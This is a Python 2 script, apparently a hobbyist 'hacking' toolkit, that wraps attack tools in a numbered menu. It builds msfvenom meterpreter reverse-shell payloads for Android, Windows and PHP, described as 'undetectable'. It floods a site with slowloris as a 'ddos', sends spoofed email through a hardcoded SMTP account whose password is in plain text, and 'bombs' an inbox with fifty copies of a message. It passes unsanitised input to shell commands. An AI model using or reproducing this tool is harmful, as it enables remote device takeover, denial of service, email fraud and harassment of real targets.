#! /usr/bin/python
#made by ANONYMOUS341
import os
from termcolor import colored
from validate_email import validate_email
if os.getuid() != 0:
        print("Are you root? Please execute as root")
        print("try sudo ly")
        exit()
os.system("clear")
def bomb():
  sm = raw_input("enter the smtp server url: ")
  sp = raw_input("enter the port: ")
  su = raw_input("enter the smtp username: ")
  spw = raw_input("enter the smtp password: ")
  f = raw_input("enter the email address from which you want to send: ")
  t = raw_input("enter the email address to which you want to send: ")
  s = raw_input("enter the subject: ")
  m = raw_input("enter the message: ")
  mail = "sendemail -f %s -t %s -u %s -m %s -s %s:%s -xu %s -xp %s" % (f, t, s, m, sm, sp, su, spw)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system(mail)
  os.system("figlet Success")
  cont = raw_input("do you want to continue with lazy Y/N : ")
def chec():
    ema = raw_input("Type the email to search: ")
    is_valid = validate_email(ema,verify=True)
    if str(is_valid).upper() == "TRUE":
        print "[+]Email Found"
    else:
	    print "[+]Email not found"
    cont = raw_input("do you want to continue with lazy Y/N : ")
    if cont == "y":
      os.system("ly")
    elif cont == "Y":
      os.system("ly")
def nikto():
  w = raw_input("type url to scan: ")
  w1 = "nikto -h %s" %(w,)
  os.system(w1)
def spoof():
  f = raw_input("enter the email address from which you want to send: ")
  t = raw_input("enter the email address to which you want to send: ")
  s = raw_input("enter the subject: ")
  m = raw_input("enter the message: ")
  mail = "sendemail -f %s -t %s -u %s -m %s -s mail.smtp2go.com:2525 -xu shilpi2126@gmail.com -xp ayush1706" % (f, t, s, m)
  os.system(mail)
  os.system("figlet Success")
  cont = raw_input("do you want to continue with lazy Y/N : ")
  if cont == "y":
    os.system("ly")
  elif cont == "Y":
    os.system("ly")
def ping():
  ping = raw_input("enter the name of the website: ")
  pin = "ping %s" %(ping,)
  os.system(pin)
  os.system("figlet ping success")
  cont = raw_input("do you want to continue with lazy Y/N : ")
  if cont == "y":
    os.system("ly")
  elif cont == "Y":
    os.system("ly")
def ddos():
  d = raw_input("type the ip or url of the website: ")
  print "[+] flooding the website....."
  d1 = "slowloris -dns %s" % (d,)
  os.system(d1)
  os.system("figlet ddos success")
  cont = raw_input("do you want to continue with lazy Y/N : ")
  if cont == "y":
    os.system("ly")
  elif cont == "Y":
    os.system("ly")
def anons():
  os.system("cd 4nonimizer")
  os.system("4nonimizer stop")
  os.system("figlet stopped")
  cont = raw_input("do you want to continue with lazy Y/N : ")
  if cont == "y":
    os.system("ly")
  elif cont == "Y":
    os.system("ly")
def anon():
  os.system("cd 4nonimizer")
  os.system("4nonimizer start")
  os.system("figlet started")
  cont = raw_input("do you want to continue with lazy Y/N : ")
  if cont == "y":
    os.system("ly")
  elif cont == "Y":
    os.system("ly")
def pk():
  pk = raw_input("type the name of the package: ")
  pk2 = "apt-get install %s" % (pk,)
  print "[+] Installing....."
  os.system(pk2)
  os.system("figlet Installed")
  cont = raw_input("do you want to continue with lazy Y/N : ")
  if cont == "y":
    os.system("ly")
  elif cont == "Y":
    os.system("ly")
def ad():
  lh = raw_input("specify the LHOST: ")
  lp = raw_input("specify the LPORT: ")
  ex = "msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s -o /root/Desktop/payload.apk" % (lh, lp)
  print ("[+] generating payload on the Desktop ......")
  os.system(ex)
  os.system("figlet payload created")
  cont = raw_input("do you want to continue with lazy Y/N : ")
  if cont == "y":
    os.system("ly")
  elif cont == "Y":
    os.system("ly")
def wd():
  lh = raw_input("specify the LHOST: ")
  lp = raw_input("specify the LPORT: ")
  ex = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe -o /root/Desktop/payload.exe" % (lh, lp)
  print ("[+] generating payload on the Desktop ......")
  os.system(ex)
  os.system("figlet payload created")
  cont = raw_input("do you want to continue with lazy Y/N : ")
  if cont == "y":
    os.system("ly")
  elif cont == "Y":
    os.system("ly")
def php():
  lh = raw_input("specify the LHOST: ")
  lp = raw_input("specify the LPORT: ")
  ex = "msfvenom -p php/meterpreter/reverse_tcp LHOST=%s LPORT=%s -o /root/Desktop/payload.php" % (lh, lp)
  print ("[+] generating payload on the Desktop ......")
  os.system(ex)
  os.system("figlet payload created")
  cont = raw_input("do you want to continue with lazy Y/N : ")
  if cont == "y":
    os.system("ly")
  elif cont == "Y":
    os.system("ly")
print colored('''
    ____________________________________________________________________________
   |    _    _   _  ___  _   ___   ____  __  ___  _   _ ____    _____ _  _   _  |
   |   / \  | \ | |/ _ \| \ | \ \ / /  \/  |/ _ \| | | / ___|  |___ /| || | / | | 
   |  / _ \ |  \| | | | |  \| |\ V /| |\/| | | | | | | \___ \    |_ \| || |_| | |
   | / ___ \| |\  | |_| | |\  | | | | |  | | |_| | |_| |___) |  ___) |__   _| | |
   |/_/   \_\_| \_|\___/|_| \_| |_| |_|  |_|\___/ \___/|____/  |____/   |_| |_| |
   |____________________________________________________________________________|  
''', 'red'), colored('''               
                 Author: ANONYMOUS341       THE LAZY SCRIPT

                     CONTACT: kalilinuxhackersaround@gmail.com

        Youtube: https://www.youtube.com/channel/UCU4_WISdoFVYT21BxeRGSbQ

                MORE OPTIONS WILL BE AVAILABLE IN THE NEXT UPDATE
''', 'white'), colored('''
1. start apache2 server
2. reboot pc
3. start msfconsole
4. create undetectable android payload
5. create undetectable windows payload
6. create undetectable php payload
7. go ANONYMOUS
8. go back real
9. install a package (u just need to type the name)
10. nmap scan
11. ddos a website
12. ping a website
13. spoof an email (just type to,from,subject and message u dont need any smtp
server or account)
14. scan a website with nikto (find vulnerabilities)
15. open firefox
16. show your local ip address
17. show your public ip address
18. check if email exists
19. bomb an email (smtp required and max 50 at once to stop ctrl + z)
''', 'blue')

a = input("                              what do you want to do? : ")
if a == 1:
  os.system("figlet server started")
  os.system('service apache2 start')
  cont = raw_input("do you want to continue with lazy Y/N : ")
  if cont == "y":
    os.system("ly")
  elif cont == "Y":
    os.system("ly")
elif a == 2:
  os.system('reboot')
elif a == 3:
  os.system("figlet starting msfconsole")
  os.system('msfconsole')
elif a == 4:
  ad()
elif a == 5:
  wd()
elif a == 6:
  php()
elif a == 7:
  anon()
elif a == 8:
  anons()
elif a == 9:
  pk()
elif a == 10:
  os.system("nmap -p 80 192.168.0.1-255")
  os.system("figlet scan success")
  cont = raw_input("do you want to continue with lazy Y/N : ")
  if cont == "y":
    os.system("ly")
  elif cont == "Y":
    os.system("ly")
elif a == 11:
  ddos()
elif a == 12:
  ping()
elif a == 13:
  spoof()
elif a == 14:
  nikto()
elif a == 15:
  os.system("firefox")
elif a == 16:
  os.system("ifconfig")
  cont = raw_input("do you want to continue with lazy Y/N : ")
  if cont == "y":
    os.system("ly")
  elif cont == "Y":
    os.system("ly")
elif a == 17:
  ip = "dig +short myip.opendns.com @resolver1.opendns.com"
  i2 = os.system(ip)
  cont = raw_input("do you want to continue with lazy Y/N : ")
  if cont == "y":
    os.system("ly")
  elif cont == "Y":
    os.system("ly")
elif a == 18:
  chec()
elif a == 19:
  bomb()
else:
  print("error choose 1 2 3 4 etc...")
  cont = raw_input("do you want to continue with lazy Y/N : ")
  if cont == "y":
    os.system("ly")
  elif cont == "Y":
    os.system("ly")
